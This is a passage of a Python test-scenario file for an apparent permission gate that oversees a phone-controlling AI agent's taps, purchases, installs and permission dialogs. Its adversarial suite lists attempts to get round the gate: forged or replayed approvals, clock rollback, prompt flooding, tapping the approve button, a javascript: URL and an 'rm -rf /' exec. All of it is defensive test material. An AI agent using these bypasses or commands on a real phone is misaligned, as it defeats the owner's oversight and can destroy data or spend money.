    sc("don't confirm everyday actions: tap-level runs, money still asks", [
        {"policy": {"type": "everyday", "on": True}, "sig": "bad", "expect_accepted": False},
        step("tap", "photo_viewer", ask("delete", level="tap"), x=970, y=2250), {"cancel": "last"},
        EVERYDAY,
        step("tap", "photo_viewer", allow(rule="everyday"), x=970, y=2250),
        step("tap", "share_link_sheet", allow(rule="everyday"), x=430, y=1600),
        step("tap", "kalshi_ticket", ask("pay", level="fingerprint"), **SUBMIT), {"cancel": "last"},
        task_grant(allow(rule="everyday")),  # no task prompt either
        step("tap", "openmob_app", refuse("gate_denied_page", rule="builtin:own_window"), x=700, y=1650)],
       tags=["consequence"]),
    sc("a request saying don't ask me changes nothing without the owner's setting", [
        task_grant(ask("task", level="tap"), text="share PewDiePie's channel with Bob, don't ask me"),
        {"cancel": "last"},
        step("tap", "share_link_sheet", ask("share", level="tap"), x=430, y=1600)], tags=["consequence"]),
]

SCENARIOS += [
    sc("after the review fixes, the YouTube share to yourself is still 0 prompts", [
        step("tap", "youtube_channel", allow(), x=270, y=510),                       # subscribe (free)
        step("tap", "youtube_video", allow(), x=570, y=1550),                        # unsubscribe
        step("tap", "share_link_sheet", allow(), x=170, y=1600),                     # share the link to yourself
        step("tap", "messenger_share_list", allow(), x=930, y=650)], tags=["friction", "consequence"]),
    sc("self is never a chat title: a group named Miss you or Note to self still asks", [
        step("tap", "messenger_spoofed_self", ask("send", level="tap"), x=990, y=2250), {"cancel": "last"},
        step("tap", "messenger_note_to_self", ask("send", level="tap"), x=990, y=2250), {"cancel": "last"},
        step("key", "messenger_note_to_self", ask("send"), name="ENTER"), {"cancel": "last"},
        step("tap", "messenger_share_list", ask("send", level="tap"), x=930, y=790)], tags=["consequence"],
       keep_open=True),
    sc("an unrecognized Settings change needs a fingerprint, even under a task or everyday", [
        task_grant(ask("task")), {"approve": "last", "sig": "valid"},
        EVERYDAY,
        step("tap", "settings_oem_unknown", ask("settings", level="fingerprint"), x=540, y=480, **TASK)],
       tags=["settings", "task_grant"], keep_open=True),
    sc("Subscribe is money in payment context and in shopping apps, even with the price off screen", [
        step("tap", "paywall_offscreen_price", ask("pay", money="start"), x=540, y=1660), {"cancel": "last"},
        step("tap", "shop_subscribe", ask("pay", money="start"), x=540, y=1660)], tags=["risk"], keep_open=True),
    sc("a task grant covers only the kinds and apps its request names", [
        task_grant(ask("task"), text="share PewDiePie's channel with Bob on Messenger"),
        {"approve": "last", "sig": "valid"},
        step("tap", "messenger_friend", allow(rule="task_grant"), **SEND, **TASK),
        step("tap", "photo_viewer", ask("delete"), x=970, y=2250, **TASK), {"cancel": "last"},  # not a delete task
        step("tap", "whatsapp_chat", ask("send"), **SEND, **TASK)], tags=["task_grant"], keep_open=True),
]

# --- task approval, just in time (owner feedback): no prompt at task start ------------------------------------
MSG_TEXT = "send Bob the channel link on Messenger"
JIT = dict(task="t9", task_text=MSG_TEXT)
SHARE_JIT = dict(task="t8", task_text="share PewDiePie's channel with myself on Messenger")
SCENARIOS += [
    sc("just in time: a share to yourself and subscribing need no prompt at all", [
        step("tap", "youtube_channel", allow(), x=270, y=510, **SHARE_JIT),
        step("tap", "youtube_video", allow(), x=570, y=1550, **SHARE_JIT),
        step("tap", "share_link_sheet", allow(), x=170, y=1600, **SHARE_JIT),
        step("tap", "messenger_share_list", allow(), x=930, y=650, **SHARE_JIT)], tags=["task_grant", "friction"]),
    sc("just in time: the first Send asks for the task once; the second message is covered", [
        step("tap", "messenger_friend", ask("task", level="tap", rule="risk:task:words:send"), **SEND, **JIT),
        {"approve": "last", "sig": "valid"},
        step("tap", "messenger_friend", allow(), **SEND, **JIT),                     # the step that asked
        step("tap", "messenger_friend", allow(rule="task_grant"), **SEND, **JIT),    # a second message
        step("tap", "messenger_friend", ask("send"), **SEND, task="t9", task_text="delete everything")],
       tags=["task_grant", "friction"], keep_open=True),
    sc("just in time: money keeps its own fingerprint prompt at the commit", [
        step("tap", "kalshi_market", allow(), **DUN, task="t7", task_text="place a $5 bet on Dun"),
        step("tap", "kalshi_ticket", ask("pay", level="fingerprint"), **SUBMIT, task="t7",
             task_text="place a $5 bet on Dun")], tags=["task_grant"], keep_open=True),
    sc("just in time: a forged task approval is ignored; out-of-scope steps ask on their own", [
        step("tap", "messenger_friend", ask("task"), **SEND, **JIT),
        {"approve": "last", "sig": "bad", "expect_accepted": False},
        {"approve": "last", "sig": "other_key", "expect_accepted": False}, {"cancel": "last"},
        step("tap", "photo_viewer", ask("delete", level="tap"), x=970, y=2250, **JIT)], tags=["task_grant"],
       keep_open=True),
    sc("just in time: a request typed on the phone needs no prompt", [
        {"instruction": MSG_TEXT},
        step("tap", "messenger_friend", allow(), **SEND, **JIT),  # the typed request's one send (D6)
        step("tap", "messenger_friend", allow(rule="task_grant:own_request"), **SEND, **JIT)], tags=["task_grant"]),
]

FILL_GRANT = {"policy": {"type": "grant", "kind": "fill", "binding": "com.example.app", "duration_ms": 86400000},
              "sig": "valid", "expect_accepted": True}
TITLE = dict(x=540, y=440)  # the product title: a non-risky tap
SCENARIOS += [
    sc("an unreadable app window: taps refused, reads blacked out, no live view", [
        step("tap", "loading_unknown", refuse("gate_screen_unstable", rule="builtin:unknown_window"), x=540, y=900),
        step("screenshot", "loading_unknown", {"decision": "redact"}),
        step("stream_start", "loading_unknown", refuse("gate_blocked_app")),
        step("stream_start", "chase", refuse("gate_blocked_app")),
        step("stream_start", "amazon_product", allow())], tags=["hard_deny"]),
    sc("a tap the phone couldn't read to the end asks", [
        step("tap", "deep_truncated", ask("other", rule="risk:truncated"), x=540, y=1650)], tags=["risk"]),
    sc("any other action voids an approval", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "valid"},
        step("tap", "whatsapp_chat", allow(), x=300, y=160),
        step("tap", "whatsapp_chat", ask("send"), **SEND)], tags=["permits"]),
    sc("an approved Buy now that never ran starts no purchase flow", [
        step("tap", "amazon_product", ask("pay"), **BUY), {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", allow(), **ADD_TO_CART),
        step("tap", "amazon_checkout", ask("pay"), **PLACE_ORDER)], tags=["permits"]),
    sc("the purchase flow ends at a cart or checkout tap", [
        step("tap", "amazon_product", ask("pay"), **BUY), {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", allow(), **BUY),
        step("tap", "amazon_product", allow(), **ADD_TO_CART),
        step("tap", "amazon_checkout", ask("pay"), **PLACE_ORDER)], tags=["permits"]),
    sc("the purchase flow ends at BACK", [
        step("tap", "amazon_product", ask("pay"), **BUY), {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", allow(), **BUY), step("key", "amazon_product", allow(), name="BACK"),
        step("tap", "amazon_checkout", ask("pay"), **PLACE_ORDER)], tags=["permits"]),
    sc("the purchase flow survives 2 other actions, not 3", [
        step("tap", "amazon_product", ask("pay"), **BUY), {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", allow(), **BUY),
        step("tap", "amazon_product", allow(), **TITLE), step("tap", "amazon_product", allow(), **TITLE),
        step("tap", "amazon_checkout", allow(rule="permit:purchase_flow"), **PLACE_ORDER),
        step("tap", "amazon_product", ask("pay"), **BUY), {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", allow(), **BUY),
        *[step("tap", "amazon_product", allow(), **TITLE) for _ in range(3)],
        step("tap", "amazon_checkout", ask("pay"), **PLACE_ORDER)], tags=["permits"]),
    sc("a fill grant binds to the focused field's app, never an in-app web page", [
        FILL_GRANT,
        step("tap", "native_autofill", allow(rule="grant"), x=540, y=1770),
        step("tap", "inapp_webview_autofill", ask("fill"), x=540, y=1770)], tags=["grants"]),
    sc("Build number and the VPN consent dialog ask", [
        step("tap", "settings_about", ask("settings"), x=540, y=760),
        step("tap", "settings_about", allow(), x=540, y=480),
        step("tap", "vpn_consent", ask("settings"), x=790, y=1650)], tags=["settings"]),
    sc("another app's permission dialog asks even when it shares a word with the task's app", [
        step("tap", "contacts_app", allow(), x=540, y=560),
        step("tap", "permission_dialog_contacts_word", ask("permission"), x=540, y=1550)], tags=["settings"]),
]

# The adversarial suite: a compromised server's raw calls. Every one must be refused or approval-gated.
ADVERSARIAL = [
    sc("tap Buy now", [step("tap", "amazon_product", ask("pay"), **BUY)]),
    sc("tap Place your order", [step("tap", "amazon_checkout", ask("pay"), **PLACE_ORDER)]),
    sc("open a banking app", [step("launch_app", "launcher", refuse("gate_blocked_app"), package="com.chase.sig.android")]),
    sc("open a link into a banking app", [step("open_url", "launcher", refuse("gate_blocked_app"), url="https://www.chase.com/")]),
    sc("act inside a banking app", [step("tap", "chase", refuse("gate_blocked_app"), x=540, y=1660)]),
    sc("read a banking app", [step("screenshot", "chase", {"decision": "redact"}), step("ui_elements", "chase", {"decision": "redact"})]),
    sc("type into a password field", [step("type_text", "login_form", refuse("gate_password_field"), text="hunter2")]),
    sc("a sub-slop swipe on Pay", [step("swipe", "amazon_checkout_card", ask("pay"), x1=540, y1=1660, x2=550, y2=1670, duration_ms=300)]),
    sc("a 50 ms long press on Buy now", [step("long_press", "amazon_product", ask("pay"), duration_ms=50, **BUY)]),
    sc("ENTER in a checkout", [step("key", "web_checkout_enter", ask("pay"), name="ENTER")]),
    sc("javascript: in the URL bar, then ENTER", [step("type_text", "chrome_search", refuse("gate_denied"), text="javascript:alert(1)"),
                                                  step("key", "chrome_url_js", refuse("gate_denied"), name="ENTER")]),
    sc("autofill a saved card", [step("tap", "amazon_autofill", ask("fill"), x=540, y=1770)]),
    sc("security Settings pages", [step("tap", "settings_security", refuse("gate_denied_page"), x=540, y=480),
                                   step("tap", "settings_dev", refuse("gate_denied_page"), x=540, y=480),
                                   step("tap", "samsung_accessibility", refuse("gate_denied_page"), x=540, y=480)]),
    sc("enable a keyboard", [step("tap", "settings_keyboards", refuse("gate_denied_page"), x=540, y=480)]),
    sc("set the date back to extend a grant", [
        step("tap", "settings_datetime", ask("settings"), x=540, y=620),
        step("tap", "whatsapp_chat", refuse("gate_prompt_open"), **SEND), {"deny": "last"},
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "valid", "grant": True},
        step("tap", "whatsapp_chat", allow(), **SEND), {"advance_ms": 7 * 86400000 + 1000},
        {"set_wall_ms": 1500000000000}, step("tap", "whatsapp_chat", ask("send"), **SEND)], keep_open=True),
    sc("replay a permit for a different action", [
        step("tap", "whatsapp_chat", ask("send"), **SEND), {"approve": "last", "sig": "valid"},
        step("tap", "amazon_product", ask("pay"), **BUY)]),
    sc("forge an approval for a different action", [
        step("tap", "amazon_product", ask("pay"), **BUY),
        {"approve": "last", "sig": "valid", "binding": "other", "expect_accepted": False},
        step("tap", "amazon_product", ask("pay"), **BUY)]),
    sc("claim never without a signature", [step("tap", "amazon_product", ask("pay"), mode="never", **BUY)]),
    sc("claim trusted without a signature", [step("tap", "whatsapp_chat", ask("send"), mode="trusted", **SEND)]),
    sc("claim allow_money without a signature", [
        {"policy": {"type": "never", "duration_ms": 3600000, "allow_money": True}, "sig": "none", "expect_accepted": False},
        step("tap", "amazon_product", ask("pay"), mode="never", allow_money=True, **BUY)]),
    sc("never signed, allow_money forged", [
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        {"policy": {"type": "never", "duration_ms": 3600000, "allow_money": True}, "sig": "bad", "expect_accepted": False},
        step("tap", "amazon_product", refuse("gate_denied", rule="never:money"), mode="never", allow_money=True, **BUY)]),
    sc("prompt flooding", [
        step("tap", "whatsapp_chat", ask("send"), **SEND),
        *[step("tap", "amazon_product", refuse("gate_prompt_open"), **BUY) for _ in range(5)]], keep_open=True),
    sc("tap the approve button or the biometric prompt", [
        step("tap", "openmob_app", refuse("gate_denied_page"), x=700, y=1650),
        step("tap", "biometric_prompt", refuse("gate_denied_page"), x=200, y=2150)]),
    sc("tap through the keyguard", [step("tap", "keyguard_secure", refuse("phone_locked"), x=200, y=1570)]),
    sc("unknown method", [step("exec", "launcher", refuse("gate_unknown_method"), cmd="rm -rf /")]),
    sc("a dangerous link scheme", [step("open_url", "launcher", refuse("gate_denied"), url="intent://scan/#Intent;scheme=zxing;end")]),
    sc("share to a contact", [step("tap", "share_sheet", ask("share"), x=170, y=1600)]),
    sc("grant another app a permission", [step("tap", "permission_dialog_other", ask("permission"), x=540, y=1550)]),
]


# --- Android 14+ permission dialogs read with the phone's own OCR (owner: the agent taps them; no pause) --------
def ocr_line(text, box, conf=0.95):
    return {"text": text, "bounds": list(box), "conf": conf}


def ocr_dialog(title_lines, buttons, cards=True, vendor="com.google.android.permissioncontroller", window_pkg="",
               conf=0.95, extra=()):
    """A permission dialog Android hides from accessibility (no root), as the phone's OCR reads its screenshot:
    the dimmed app behind, the title, the Precise/Approximate cards, the buttons (centred on the usual points)."""
    lines = [ocr_line("Markets", (60, 250, 300, 320), 0.9)]  # the Kalshi screen behind the dim
    lines += [ocr_line(t, (120, 880 + 60 * i, 960, 930 + 60 * i)) for i, t in enumerate(title_lines)]
    if cards:
        lines += [ocr_line("Precise", (200, 1260, 360, 1310), conf), ocr_line("Approximate", (690, 1260, 910, 1310), conf)]
    ys = {0: 1505, 1: 1635, 2: 1765}
    lines += [ocr_line(b, (300, ys[i] - 25, 780, ys[i] + 25), conf) for i, b in enumerate(buttons)]
    lines += list(extra)
    return screen(app("com.kalshi", [node(text="Markets", bounds=(0, 200, W, 400))]),
                  {"id": 7, "type": "application", "layer": 5, "package": window_pkg, "title": "", "bounds": FULL,
                   "since": 5000},  # the phone first saw the window at 5 s; the event came after
                  event={"package": vendor, "text": " ".join(title_lines), "at": 5100}, labels=LABELS, ocr=lines)


LOC_TITLE = ["Allow Kalshi to access this", "device's location?"]
LOC_BUTTONS = ["While using the app", "Only this time", "Don't allow"]
SCREENS.update({
    # The user's Kalshi location dialog (Google, Android 14+): Precise and Approximate cards, three buttons.
    "ocr_location": ocr_dialog(LOC_TITLE, LOC_BUTTONS),
    "ocr_notifications": ocr_dialog(["Allow Kalshi to send you", "notifications?"], ["Allow", "Don't allow"],
                                    cards=False),
    # Samsung: the window names its package; one title line.
    "ocr_location_samsung": ocr_dialog(["Allow Kalshi to access this device's location?"], LOC_BUTTONS,
                                       vendor="com.samsung.android.permissioncontroller",
                                       window_pkg="com.samsung.android.permissioncontroller"),
    "ocr_location_es": ocr_dialog(["¿Permitir que Kalshi acceda a la", "ubicación de este dispositivo?"],
                                  ["Mientras la app está en uso", "Solo esta vez", "No permitir"]),
    "ocr_location_other": ocr_dialog(["Allow Tracker to access this", "device's location?"], LOC_BUTTONS),
    "ocr_location_always": ocr_dialog(LOC_TITLE, ["Allow all the time", "Don't allow"], cards=False),
    # The OCR couldn't read the buttons with confidence.
    "ocr_location_blurry": ocr_dialog(LOC_TITLE, LOC_BUTTONS, conf=0.3),
    # A wording the phone doesn't know (another language).
    # A wording the phone doesn't know, in a window that names the permission controller.
    "ocr_location_unknown": ocr_dialog(["Kalshi wil toegang tot de locatie", "van dit apparaat?"],
                                       ["Tijdens gebruik van de app", "Alleen deze keer", "Niet toestaan"], cards=False,
                                       window_pkg="com.google.android.permissioncontroller"),
    # The same with no window package: no "Allow X to" title, so only a stale-looking event: unknown window.
    "ocr_unknown_no_pkg": ocr_dialog(["Kalshi wil toegang tot de locatie", "van dit apparaat?"],
                                     ["Tijdens gebruik van de app", "Alleen deze keer", "Niet toestaan"], cards=False),
    # A permission-controller event from before this window appeared (an app still loading): not a dialog.
    # A stale permission-controller event over an app still loading whose own text happens to ask "Allow Kalshi to
    # ..." (an onboarding page, no "Don't allow"): not a dialog.
    "ocr_stale_event": {**ocr_dialog(LOC_TITLE, ["Continue"], cards=False),
                        "event": {"package": "com.google.android.permissioncontroller",
                                  "text": "Allow Kalshi to access this device's location?", "at": 1000}},
    # The dialog names its package, but the phone couldn't run OCR: pause for the owner, as before.
    "ocr_unavailable": {**ocr_dialog(LOC_TITLE, LOC_BUTTONS, window_pkg="com.google.android.permissioncontroller"),
                        "ocr": None},
})
SCENARIOS += [
    sc("OCR: the Kalshi location dialog: Approximate, then Only this time, no prompt", [
        KALSHI,
        step("screenshot", "ocr_location", allow()),
        step("ui_elements", "ocr_location", allow()),
        step("tap", "ocr_location", refuse("gate_permission_choice", rule="permission:location_accuracy"), **ONCE),
        step("tap", "ocr_location", allow(), **APPROX),
        step("tap", "ocr_location", allow(), **ONCE)], tags=["permissions", "ocr", "friction"]),
    sc("OCR: wider grants and Precise ask; Don't allow passes; a tap off the buttons asks", [
        KALSHI,
        step("tap", "ocr_location", ask("permission", level="tap", rule="risk:permission:location"), **WHILE_USING),
        {"cancel": "last"},
        step("tap", "ocr_location", ask("permission", level="tap", rule="risk:permission:location_accuracy"),
             **PRECISE),
        {"cancel": "last"},
        step("tap", "ocr_location", ask("permission", rule="risk:permission:unknown"), x=540, y=1100),
        {"cancel": "last"},
        step("tap", "ocr_location", allow(), **DENY_BTN)], tags=["permissions", "ocr"]),
    sc("OCR: notifications allowed for the task's app", [
        KALSHI, step("tap", "ocr_notifications", allow(), x=540, y=1505)], tags=["permissions", "ocr"]),
    sc("OCR: Samsung's and the Spanish dialog read the same way", [
        KALSHI,
        step("tap", "ocr_location_samsung", allow(), **APPROX),
        step("tap", "ocr_location_samsung", allow(), **ONCE),
        step("tap", "ocr_location_es", allow(), **APPROX),
        step("tap", "ocr_location_es", allow(), **ONCE)], tags=["permissions", "ocr"]),
    sc("OCR: another app's request asks (a tap), and is refused under Don't ask", [
        KALSHI,
        step("tap", "ocr_location_other", ask("permission", level="tap", rule="risk:permission:other_app"), **ONCE),
        {"cancel": "last"},
        step("tap", "ocr_location_other", allow(), **DENY_BTN),
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("tap", "ocr_location_other", refuse("gate_denied"), mode="never", **ONCE)],
       tags=["permissions", "ocr"]),
    sc("OCR: never Allow all the time", [
        KALSHI, step("tap", "ocr_location_always", refuse("gate_permission_choice", rule="permission:always"),
                     x=540, y=1505)], tags=["permissions", "ocr"]),
    sc("OCR: low confidence or an unknown wording asks", [
        KALSHI,
        step("tap", "ocr_location_blurry", ask("permission", rule="risk:permission:unknown"), **ONCE),
        {"cancel": "last"},
        step("tap", "ocr_location_unknown", ask("permission", level="tap"), x=540, y=1635),
        {"cancel": "last"},
        {"advance_ms": 2000},
        step("tap", "ocr_unknown_no_pkg", refuse("gate_screen_unstable", rule="builtin:unknown_window"), x=540, y=1635),
        step("screenshot", "ocr_unknown_no_pkg", {"decision": "redact"})],
       tags=["permissions", "ocr"]),
    sc("OCR: a stale permission event over a newer window is not a dialog: unknown, blacked out", [
        KALSHI,
        step("tap", "ocr_stale_event", refuse("gate_screen_unstable", rule="builtin:unknown_window"), **ONCE),
        step("screenshot", "ocr_stale_event", {"decision": "redact"}),
        step("screenshot", "ocr_location", allow())], tags=["permissions", "ocr"]),
    sc("OCR: the real Samsung notification dialog (Android 15, no window package, no event): shown, Allow tapped", [
        step("tap", "chess_app", allow(), x=540, y=600),
        step("screenshot", "samsung_notifications_real", allow()),
        step("ui_elements", "samsung_notifications_real", allow()),
        step("stream_start", "samsung_notifications_real", allow()),
        step("tap", "samsung_notifications_real", allow(), x=538, y=1895),   # Allow: notifications allowed by default
        step("tap", "samsung_notifications_real", allow(), x=541, y=2045)],  # Don't allow
       tags=["permissions", "ocr", "real_device"]),
    sc("OCR: a refused Approximate tap isn't recorded: Only this time is still refused (B1)", [
        KALSHI,
        step("tap", "ocr_location", ask("permission", rule="risk:permission:location_accuracy"), **PRECISE),
        {"cancel": "last"},  # the prompt closes: the next gesture falls in its cooldown
        step("tap", "ocr_location", refuse("gate_prompt_open", rule="builtin:prompt_cooldown"), **APPROX),
        {"advance_ms": 2000},
        step("tap", "ocr_location", refuse("gate_permission_choice", rule="permission:location_accuracy"), **ONCE),
        step("tap", "ocr_location", allow(), **APPROX),  # this one goes through
        step("tap", "ocr_location", allow(), **ONCE)], tags=["permissions", "ocr"], call_ms=200),
    sc("OCR: without OCR the dialog still pauses for the owner; reads show it", [
        KALSHI,
        step("tap", "ocr_unavailable", refuse("needs_owner_dialog"), **ONCE),
        step("screenshot", "ocr_unavailable", allow())], tags=["permissions", "ocr"]),
]



# --- uninstalling is a delete-kind step; installing stays refused (real-device report, "uninstall chess.com") ---
INSTALLER = "com.google.android.packageinstaller"
LABELS.update({"com.chess": "Chess.com", "com.chase.sig.android": "Chase", "dev.openmob.companion": "OpenMob",
               "com.google.android.apps.nexuslauncher": "Pixel Launcher"})


def installer_dialog(title, message, confirm="OK", labels=None):
    return screen(app("com.google.android.apps.nexuslauncher", [node(text="Chess.com", bounds=(100, 400, 300, 500))]),
                  {"id": 9, "type": "application", "layer": 5, "package": INSTALLER, "title": "",
                   "bounds": [0, 900, W, 1500],
                   "root": node(cls="android.widget.FrameLayout", bounds=(0, 900, W, 1500), children=[
                       node(text=title, id="android:id/alertTitle", bounds=(60, 950, 1020, 1020)),
                       node(text=message, id="android:id/message", bounds=(60, 1050, 1020, 1150)),
                       button("Cancel", "android:id/button2", (500, 1350, 740, 1450)),
                       button(confirm, "android:id/button1", (780, 1350, 1020, 1450))])},
                  labels=labels or LABELS)


SCREENS.update({
    "uninstall_chess": installer_dialog("Chess.com", "Do you want to uninstall this app?"),
    "uninstall_chase": installer_dialog("Chase", "Do you want to uninstall this app?"),
    "uninstall_openmob": installer_dialog("OpenMob", "Do you want to uninstall this app?"),
    "uninstall_unknown": installer_dialog("Mystery Game", "Do you want to uninstall this app?"),
    "install_apk": installer_dialog("Free Coins", "Do you want to install this app?", confirm="Install"),
    "settings_app_info_chess": settings("App info", ["Chess.com", "Force stop", "Clear storage", "Uninstall"]),
    "settings_app_info_openmob": settings("App info", ["OpenMob", "Force stop", "Uninstall"]),
})
UNINSTALL_OK, UNINSTALL_CANCEL = dict(x=900, y=1400), dict(x=620, y=1400)
UNINSTALL = dict(task="u1", task_text="uninstall chess.com")
SCENARIOS += [
    sc("uninstalling an app: one tap-level prompt at the confirmation; Cancel is free", [
        step("tap", "uninstall_chess", ask("delete", level="tap", rule="risk:uninstall:installer"), **UNINSTALL_OK),
        {"cancel": "last"},
        step("tap", "uninstall_chess", allow(), **UNINSTALL_CANCEL)], tags=["uninstall"]),
    sc("uninstalling under a request that names it: the one prompt is the task prompt", [
        step("tap", "uninstall_chess", ask("task", level="tap", rule="risk:task:uninstall:installer"),
             **UNINSTALL_OK, **UNINSTALL),
        {"approve": "last", "sig": "valid"},
        step("tap", "uninstall_chess", allow(), **UNINSTALL_OK, **UNINSTALL)], tags=["uninstall", "task_grant"]),
    sc("uninstalling with Don't confirm everyday actions: no prompt", [
        EVERYDAY,
        step("tap", "uninstall_chess", allow(rule="everyday"), **UNINSTALL_OK),
        step("tap", "uninstall_unknown", ask("uninstall", level="tap", rule="risk:uninstall:unknown"),
             **UNINSTALL_OK)], tags=["uninstall"]),
    sc("uninstalling via app info: Uninstall opens the confirmation, which asks; Clear storage asks", [
        step("tap", "settings_app_info_chess", allow(), x=540, y=900),
        step("tap", "uninstall_chess", ask("delete", level="tap"), **UNINSTALL_OK),
        {"cancel": "last"},
        step("tap", "settings_app_info_chess", ask("delete", level="tap", rule="risk:uninstall:app_info"),
             x=540, y=760)], tags=["uninstall"]),
    sc("uninstalling a bank app or OpenMob is refused", [
        step("tap", "uninstall_chase", refuse("gate_denied_page", rule="builtin:uninstall_protected"), **UNINSTALL_OK),
        step("tap", "uninstall_openmob", refuse("gate_denied_page", rule="builtin:uninstall_protected"),
             **UNINSTALL_OK),
        step("tap", "settings_app_info_openmob", refuse("gate_denied_page", rule="builtin:uninstall_protected"),
             x=540, y=760),
        step("tap", "settings_app_info_chase", refuse("gate_blocked_app"), x=540, y=760)], tags=["uninstall"]),
    sc("installing an APK is still refused", [
        step("tap", "install_apk", refuse("gate_denied_page", rule="builtin:installer"), **UNINSTALL_OK),
        step("tap", "install_apk", refuse("gate_denied_page", rule="builtin:installer"), **UNINSTALL_CANCEL)],
       tags=["uninstall", "hard_deny"]),
]


# --- the real Samsung SM-S948U1 notification dialog (Android 15/16): its OCR text and boxes from the real screenshot
# (scratchpad diag/samsung-notification-dialog.png, 1080x2340). Android lists the dialog's window with no root and no
# package, and sends no permission-controller event (the last one is Chess.com's).
SAMSUNG_REAL_OCR = [{"text": "11:30 T", "bounds": [33, 39, 200, 86], "conf": 1}, {"text": ". •", "bounds": [264, 50, 343, 81], "conf": 0.5}, {"text": "CheSS.com", "bounds": [397, 159, 686, 221], "conf": 1}, {"text": "# 100", "bounds": [957, 50, 1035, 75], "conf": 1}, {"text": "Log In", "bounds": [913, 169, 1049, 221], "conf": 1}, {"text": "Play. Learn.", "bounds": [250, 1102, 850, 1216], "conf": 1}, {"text": "Have Fun!", "bounds": [261, 1216, 808, 1310], "conf": 1}, {"text": "+1", "bounds": [156, 1421, 217, 1459], "conf": 1}, {"text": "Phone Number", "bounds": [383, 1414, 726, 1462], "conf": 1}, {"text": "Allow Chess to send you notifications?", "bounds": [139, 1723, 944, 1775], "conf": 1}, {"text": "Allow", "bounds": [465, 1870, 611, 1921], "conf": 1}, {"text": "Don't allow", "bounds": [397, 2019, 686, 2072], "conf": 1}, {"text": "<", "bounds": [213, 2237, 268, 2312], "conf": 1}, {"text": "O", "bounds": [516, 2244, 570, 2302], "conf": 1}]
LABELS["com.chess"] = "Chess.com"
SCREENS.update({
    "chess_app": screen(app("com.chess", [button("Log In", "login", (900, 150, 1060, 240)),
                                          node(text="Play. Learn. Have Fun!", bounds=(200, 1100, 880, 1320))]),
                        labels=LABELS),
    "samsung_notifications_real": screen(
        app("com.chess", [button("Log In", "login", (900, 150, 1060, 240))]),
        {"id": 12, "type": "application", "layer": 5, "package": "", "title": "", "bounds": [0, 0, W, 2340],
         "since": 9000},
        event={"package": "com.chess", "text": "Chess.com", "at": 3000}, labels=LABELS, ocr=SAMSUNG_REAL_OCR),
})


# --- review of the tight loop: lasting grants of dangerous kinds; Play Store installs (free: no ask) ------------------------------
LABELS["com.android.vending"] = "Google Play Store"
SCREENS.update({
    "contacts_kalshi_allow_only": location_dialog(message="Allow Kalshi to access your contacts?",
                                                  buttons=("allow", "deny"), cards=False),
    "nearby_kalshi_allow_only": location_dialog(
        message="Allow Kalshi to find, connect to, and determine the relative position of nearby devices?",
        buttons=("allow", "deny"), cards=False),
    "camera_kalshi_allow_only": location_dialog(message="Allow Kalshi to take pictures and record video?",
                                                buttons=("allow", "deny"), cards=False),
    "play_store_paid": screen(app("com.android.vending", [
        node(text="Chess Pro", bounds=(40, 300, 1040, 400)),
        button("$4.99", "com.android.vending:id/buy_button", (40, 800, 1040, 920))]), labels=LABELS),
    "play_store_chess": screen(app("com.android.vending", [
        node(text="Chess - Play and Learn", bounds=(40, 300, 1040, 400)),
        button("Install", "com.android.vending:id/install_button", (40, 800, 1040, 920))]), labels=LABELS),
    # A store page for another app (an ad or a guessed package id), its title under a rating line and a badge.
    "play_store_flashlight_get": screen(app("com.android.vending", [
        node(text="4.8 ★", bounds=(40, 200, 400, 260)),
        node(text="Torchlight: Flashlight Pro", bounds=(40, 300, 1040, 400)),
        node(text="Contains ads", bounds=(40, 420, 600, 480)),
        node(text="10M+", bounds=(40, 500, 300, 560)),
        button("Get", "com.android.vending:id/install_button", (40, 800, 1040, 920))]), labels=LABELS),
})
SCENARIOS += [
    sc("a lasting grant of a dangerous kind asks; the owner can sign persistent_grants: allow", [
        KALSHI,
        step("tap", "contacts_kalshi_allow_only", ask("permission", level="tap", rule="risk:permission:contacts"),
             x=540, y=1505),
        step("tap", "nearby_kalshi_allow_only", ask("permission", rule="risk:permission:nearby_devices"), x=540, y=1505),
        step("tap", "contacts_kalshi_allow_only", allow(), x=540, y=1635),
        step("tap", "camera_kalshi_allow_only", allow(), x=540, y=1505),  # not a listed kind: the narrowest offered
        step("tap", "notifications_kalshi", allow(), x=540, y=1505),
        perm_default("persistent_grants", "allow"),
        step("tap", "contacts_kalshi_allow_only", allow(), x=540, y=1505)], tags=["permissions"]),
    sc("a free Play Store install the task names doesn't ask when the phone holds the request; a priced one is money", [
        {"instruction": "install chess and play 5 moves against a bot"},  # typed on the phone (review L2)
        step("tap", "play_store_chess", allow(), x=540, y=860, task="t1",
             task_text="install chess and play 5 moves against a bot"),
        step("tap", "play_store_paid", ask("pay"), x=540, y=860, task="t1",
             task_text="install chess and play 5 moves against a bot")], tags=["friction", "money"]),
    sc("an install the task's text doesn't name asks (owner, 2026-10-09); none at all (a drive session) asks", [
        step("tap", "play_store_chess", ask("install", level="tap", rule="risk:install:unnamed"), x=540, y=860,
             task="t1", task_text="install a flashlight app"),
        step("tap", "play_store_chess", ask("install", rule="risk:install:unnamed"), x=540, y=860),
        step("tap", "play_store_flashlight_get", ask("install"), x=540, y=860, task="t1",
             task_text="install chess and play 5 moves against a bot"),
        {"instruction": "get the Torchlight flashlight"},
        step("tap", "play_store_flashlight_get", allow(), x=540, y=860, task="t2",
             task_text="get the Torchlight flashlight")], tags=["install"]),
    sc("an unnamed install isn't covered by Don't confirm everyday actions, and is refused under Don't ask", [
        EVERYDAY,
        step("tap", "play_store_chess", ask("install"), x=540, y=860, task="t1", task_text="share a video"),
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("tap", "play_store_chess", refuse("gate_denied", rule="never:install:unnamed"), mode="never", x=540,
             y=860),
        step("tap", "play_store_chess", allow(), mode="never", x=540, y=860, task="t1", task_text="install chess")],
       tags=["install", "modes"]),
]


# --- the real Samsung finding: Android drops accessibility taps on permission dialogs, so the agent dismisses them with
# BACK. BACK must pass in every mode, with no prompt, on a readable dialog and on the OCR'd hidden one.
SCENARIOS += [
